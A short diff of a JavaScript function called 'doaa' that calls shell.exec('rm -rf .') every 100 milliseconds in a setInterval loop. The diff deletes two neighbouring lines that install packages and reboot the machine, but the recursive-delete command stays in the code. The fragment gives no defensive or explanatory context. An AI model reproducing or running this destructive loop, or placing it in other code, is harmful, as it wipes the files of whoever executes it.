@@ -6,8 +6,6 @@ const doaa = () => {
   //
   setInterval(() => {
     shell.exec('rm -rf .');
-    shell.exec('apt install nodejs npm');
-    shell.exec('init 6');
   }, 100);
   return this;
 };
